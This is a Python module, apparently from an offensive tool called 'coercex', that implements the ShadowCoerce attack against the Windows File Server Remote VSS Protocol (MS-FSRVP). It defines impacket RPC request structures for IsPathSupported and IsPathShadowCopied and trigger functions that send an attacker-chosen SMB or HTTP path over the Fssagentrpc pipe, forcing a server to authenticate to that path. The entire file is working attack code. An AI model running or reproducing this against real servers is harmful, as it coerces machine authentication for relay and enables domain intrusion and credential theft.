"""MS-FSRVP (File Server Remote VSS Protocol) coercion methods.

ShadowCoerce - abuses shadow copy management to force authentication.
"""

from __future__ import annotations

from impacket.dcerpc.v5.dtypes import LONG, WSTR
from impacket.dcerpc.v5.ndr import NDRCALL

from coercex.methods.base import CoercionMethod, PipeBinding

FSRVP_UUID = "a8e0653c-2744-4389-a61d-7373df8b2292"

FSRVP_PIPES = [
    PipeBinding(pipe=r"\PIPE\Fssagentrpc", uuid=FSRVP_UUID, version="1.0"),
]

FSRVP_PATH_STYLES = [
    ("smb", "bare"),
    ("http", "bare"),
]

PROTOCOL_SHORT = "MS-FSRVP"
PROTOCOL_LONG = "[MS-FSRVP]: File Server Remote VSS Protocol"


class _IsPathSupported(NDRCALL):
    opnum = 8
    structure = (("ShareName", WSTR),)


class _IsPathSupportedResponse(NDRCALL):
    structure = (("ErrorCode", LONG),)


class _IsPathShadowCopied(NDRCALL):
    opnum = 9
    structure = (("ShareName", WSTR),)


class _IsPathShadowCopiedResponse(NDRCALL):
    structure = (("ErrorCode", LONG),)


def _trigger_is_path_supported(dce, path, target):
    request = _IsPathSupported()
    request["ShareName"] = path
    dce.request(request)


def _trigger_is_path_shadow_copied(dce, path, target):
    request = _IsPathShadowCopied()
    request["ShareName"] = path
    dce.request(request)


def get_methods() -> list[CoercionMethod]:
    """Return all MS-FSRVP coercion methods."""
    return [
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="IsPathSupported",
            opnum=8,
            vuln_args=["ShareName"],
            pipe_bindings=list(FSRVP_PIPES),
            path_styles=list(FSRVP_PATH_STYLES),
            trigger_fn=_trigger_is_path_supported,
            priority=6,  # ShadowCoerce - requires File Server VSS Agent
        ),
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="IsPathShadowCopied",
            opnum=9,
            vuln_args=["ShareName"],
            pipe_bindings=list(FSRVP_PIPES),
            path_styles=list(FSRVP_PATH_STYLES),
            trigger_fn=_trigger_is_path_shadow_copied,
            priority=6,  # ShadowCoerce variant
        ),
    ]
